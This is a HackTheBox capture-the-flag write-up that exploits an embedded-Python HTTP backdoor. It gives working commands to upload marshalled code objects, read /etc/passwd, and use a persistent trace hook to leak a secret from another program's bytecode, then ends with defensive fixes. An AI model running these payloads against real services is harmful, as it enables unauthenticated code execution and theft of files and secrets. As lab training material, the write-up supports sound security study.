## Overview

Breakin is a Medium HackTheBox **Reversing** challenge (Business CTF 2022). The target is `bkd`, a C++ HTTP backdoor (boost::asio + SimpleWeb) that embeds `libpython3.10`. It lets you upload a program and run it — the catch is *what* it runs and *where the flag actually lives*. The upload path is [insecure deserialization](https://cwe.mitre.org/data/definitions/502.html) of a Python code object, giving unauthenticated code execution; the flag is a hardcoded constant inside a preloaded program's bytecode that you recover with a trace hook.

## The technique

Grab the binary — the server helpfully lists its own filesystem at `/`, so `GET /bkd` downloads it. In radare2 (it is not stripped and ships debug info) two custom symbols stand out: `generate_file_listing` and `executePython(std::vector<unsigned char> const&)`. The routes registered in `main` are `GET /ping`, `GET /` (directory listing), `POST /exec` and `GET /exec/<name>`.

`POST /exec` takes `{"content": <hex>, "name": <str>}`, hex-decodes `content`, and stores it in a `programs[name]` map — **no authentication, no decryption**. `GET /exec/<name>` then calls `executePython`, whose disassembly is:

```text
PyMarshal_ReadObjectFromString(bytes, len)   // content = a marshalled code object
PyImport_ExecCodeModule("payload", codeobj)  // exec it as a module
PyObject_CallMethod(module, "main", NULL)     // call main()
// response body = str(main())
```

So `content` is not source — it is a raw **marshalled Python code object** whose module defines `main()`. Sending source makes `PyMarshal_ReadObjectFromString` return NULL and crashes the interpreter (the server drops the connection). Two facts drive the solve:

1. **Marshal is version-specific.** The target embeds `libpython3.10`, so the payload must be built under 3.10 — a mismatched interpreter produces bytecode the target rejects. Build it in a container.
2. **The interpreter is reused.** `executePython` guards on `Py_IsInitialized()`, so the embedded interpreter is created once and lives for the process. `sys.settrace` and `builtins` globals therefore **persist across separate HTTP requests** — the key to the whole challenge.

The box itself is empty (we run as `uid 0`, but there is no flag file). Three programs are preloaded: `key`, `creds`, `stats`. `GET /exec/key` returns *"Our current shared encryption key is &lt;sha256hex&gt;..."*. The flag is a hex constant hardcoded in the `key` program's bytecode — which is freed after each run, so scanning process memory for `HTB{` from a later request finds nothing. It has to be captured while `key` executes.

## Solution

Build every payload under Python 3.10 (Kali ships 3.13, whose marshal is incompatible):

```sh
docker run --rm -i python:3.10-slim python -c \
  'import marshal,sys;sys.stdout.buffer.write(marshal.dumps(compile(open("mod.py").read(),"payload","exec")))' \
  | xxd -p | tr -d "\n" > p.hex
```

Proof of RCE — a module that reads a file, uploaded then executed:

Create `mod.py`:

```python
def main():
    return open("/etc/passwd").read()
```

```sh
curl -s http://<target>/exec -H 'Content-Type: application/json' \
     -d "{\"content\":\"$(cat p.hex)\",\"name\":\"go\"}"
curl -s http://<target>/exec/go
```

To leak the flag, exploit the persistent interpreter. First a **hook** program that installs a trace callback capturing every executed code object into a `builtins` global (which survives to later requests):

Create `hook.py`:

```python
import sys, builtins, marshal
builtins._caps = []
_seen = set()
def tracer(frame, event, arg):
    if event == "call":
        co = frame.f_code
        if id(co) not in _seen:
            _seen.add(id(co))
            try:
                builtins._caps.append(marshal.dumps(co))
            except Exception:
                pass
    return None
def main():
    sys.settrace(tracer)
    return "hook installed"
```

Then a **reader** program that walks the captured code objects and returns the constants of the `key` program's `main` (identified by `hexdigest` in its names):

Create `reader.py`:

```python
import builtins, marshal
def main():
    for blob in getattr(builtins, "_caps", []):
        co = marshal.loads(blob)
        if co.co_name == "main" and "hexdigest" in co.co_names:
            return repr(co.co_consts)
    return "not captured"
```

Run them in order: upload `hook` and `reader`, then

```sh
curl -s http://<target>/exec/hk    # install the trace hook
curl -s http://<target>/exec/key   # key runs UNDER the hook -> captured
curl -s http://<target>/exec/rd    # dump key.main co_consts
```

The reader returns `key.main`'s constants, including a long hex string. Decode it:

```python
bytes.fromhex("4854427b...").decode()   # -> HTB{...}
```

The flag is the decoded value (redacted here) — "walk the tree" refers to walking the code-object / `co_consts` tree.

## Why it worked

The backdoor runs attacker-supplied marshalled bytecode with zero authentication — [deserializing untrusted data](https://cwe.mitre.org/data/definitions/502.html) into an executable code object is remote code execution by construction. Worse, a single embedded interpreter is shared across all requests, so state installed by one program (a trace hook) observes a *different* program's execution later, dumping bytecode that is otherwise transient and never touches disk.

## Fix / defense

Never `marshal.loads` / `PyMarshal_ReadObjectFromString` attacker-controlled bytes. Sign and verify uploaded programs before loading, and run each one in a fresh, sandboxed subinterpreter or subprocess (seccomp) rather than a shared persistent one. Finally, don't embed secrets as literals inside code an attacker can trigger and observe — a trace hook or `co_consts` read leaks them.
